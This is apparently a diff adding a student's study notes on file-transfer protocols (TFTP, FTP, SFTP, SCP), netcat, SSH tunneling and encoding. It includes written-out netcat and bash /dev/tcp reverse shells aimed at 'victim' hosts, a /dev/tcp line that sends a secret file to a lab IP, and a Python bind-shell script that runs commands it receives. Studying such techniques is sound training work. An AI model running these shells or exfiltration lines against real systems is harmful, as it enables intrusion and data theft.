@@ -1,0 +1,202 @@
+TFTP:
+  |--> UDP TRANSPORT
+        SMALL, VERY SIMPLE COMMUNICATION
+        NO TERMINAL COMMS
+        INSECURE
+
+FTP:
+  |--> 2 DIFFERENT TCP CONNECTIONS
+  |      CONTROL (21)/ DATA(20)
+  |      AUTH IN CLEAR TEXT
+  |      HAS DIRECTORY SERVICES
+  |      ANONYMOUS LOGIN
+  |
+  |---> FTPS: SECURE
+          |--> ADDS SSL/TLS ENCRPTION
+                INTERACTIVE TERMINAL ACCESS 
+                EXPLICIT MODE:20/21
+                  |--> OPTION FOR ENCRYPTION
+                IMPLICIT MODE:989/990
+                  |--> ENCRPTION ASSUMED
+
+
+SFTP:
+  |--> TCP (22)
+        ADDS FTP LIKE SERVICE TO SSH 
+        INTERACTIVE
+
+SCP:
+  |--> TCP(22)
+        SYMMETRIC AND ASYMMETRIC ENCRYPTION
+        AUTH THROUGH SIGN IN
+        NON-INTERACTIVE
+      > OPTIONS
+          |--> -V verbose
+                -P alternate port
+                -R recursively copy an entire directory
+                -3 3-way copy
+      > SYNTAX  
+          |--> scp student@172.16.82.106:secretstuff.txt /home/student
+                #Download a file from a remote directory to a local directory
+
+                scp secretstuff.txt student@172.16.82.106:/home/student
+                #Upload a file to a remote directory from a local directory
+
+                scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+                #Copy a file from a remote host to a separate remote host
+
+                scp -r folder/ student@172.16.82.106:
+                #Recursive upload of a folder to remote
+
+                scp -r student@172.16.82.106:folder/ .
+                #Recursive download of a folder from remote
+
+
+      > SCP Syntax w/ alternate SSHD
+          |--> scp -P 1111 student@172.16.82.106:secretstuff.txt .
+                #Download a file from a remote directory to a local directory
+
+                scp -P 1111 secretstuff.txt student@172.16.82.106:
+                #Upload a file to a remote directory from a local directory
+
+      > SCP Syntax through a tunnel
+          |--> ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+                #Create a local port forward to target device
+
+                scp -P 1111 student@localhost:secretstuff.txt /home/student
+                #Download a file from a remote directory to a local directory
+
+                scp -P 1111 secretstuff.txt student@localhost:/home/student
+                #Upload a file to a remote directory from a local directory
+
+      > SCP Syntax through a Dynamic Port forward
+          |--> ssh student@172.16.82.106 -D 9050 -NT
+                #Create a Dynamic Port Forward to target device
+
+                proxychains scp student@localhost:secretstuff.txt .
+                #Download a file from a remote directory to a local directory
+
+                proxychains scp secretstuff.txt student@localhost:
+                #Upload a file to a remote directory from a local directory
+
+
+  NETCAT:
+    |--> READ AND WRITES DATA ACROSS NETWORK, TCP CONNECTION
+    |      INBOUND AND OUBOUND CONNECTION, TCP/UDP TOOR FROM ANY PORT 
+    |      SEND/RECIVE DATA 
+    |      PORT SCANNING 
+    |
+    |
+    |--> NETCAT: Client to Listener file transfer
+            |--> nc -lvp 9001 > newfile.txt
+                  #Listener (receive file)
+
+                  nc 172.16.82.106 9001 < file.txt
+                  #Client (sends file)
+
+
+        > NETCAT: Listener to Client file transfer
+              |--> nc -lvp 9001 < file.txt
+                    #Listener (sends file)
+
+                    nc 172.16.82.106 9001 > newfile.txt
+                    #Client (receive file)
+
+        > File Transfer with /dev/tcp
+            |--> nc -lvp 1111 > devtcpfile.txt
+                  #On the receiving box
+
+                cat secret.txt > /dev/tcp/10.10.0.40/1111
+                #On the sending box
+                USEFUL FOR A HOST THAT DOENT HAVE NETCAT 
+
+
+REVERSE SHELL:
+    |--> nc -lvp 9999
+          #First listen for the shell on your device.
+
+          nc -c /bin/bash 10.10.0.40 9999
+          #On Victim using -c
+
+          nc -e /bin/bash 10.10.0.40 9999
+          #On Victim using -e
+
+
+    > Reverse shell using /DEV/TCP
+          |--> nc -lvp 9999
+                #First listen for the shell on your device
+
+                /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
+                #On Victim 
+
+    > REVERSE PYTHON3 SCRIPT:
+          |-->
+#!/usr/bin/python3
+import socket
+import subprocess
+PORT = 1234        # Choose an unused port
+print ("Waiting for Remote connections on port:", PORT, "\n")
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('', PORT))
+server.listen()
+while True:
+    conn, addr = server.accept()
+    with conn:
+        print('Connected by', addr)
+        while True:
+            data = conn.recv(1024).decode()
+            if not data:
+                break
+            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, err = proc.communicate()
+            response = output.decode() + err.decode()
+            conn.sendall(response.encode())
+server.close()
+
+
+
+PACKING AND  ENCODING:
+    |--> PACKERS
+            |--> Special code added to programs to compress executableS
+                  Reduces network traffic
+                  Used for obfuscation
+                  Reduces time on target
+
+        > Encoding AND Decoding:
+              |--> Specialized formatting
+                    Used for transmission and storage
+                    NOT Compression
+                    NOT Encapsulation
+                    NOT Encryption
+
+        > Hexadecimal Encoding and Decoding:
+              |--> Converts the binary representation of a data set to the 2 digit base-16 equivalent
+                    Used by IPv6 and MAC addresses
+                    Increases readability and information density
+
+
+
+
+        > XXD:
+          |--> echo "Hex encoding test" | xxd -p
+                <RANDOM HASH>
+                #echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\
+
+              echo "48657820656e636f64696e6720746573740a" | xxd -r -p
+              Hex encoding test
+              #echo hex string and use xxd to restore the data to its original format
+
+      
+
+            
+        > Base64 Encoding and Decoding: 
+              |--> binary-to-text encoding
+                    A-Z, a-z, 1-9, +, /
+                    6 bits per non-final digit
+                    padding used to fill in any unused space in each 24-bit group
+
+
+
+
+
+      
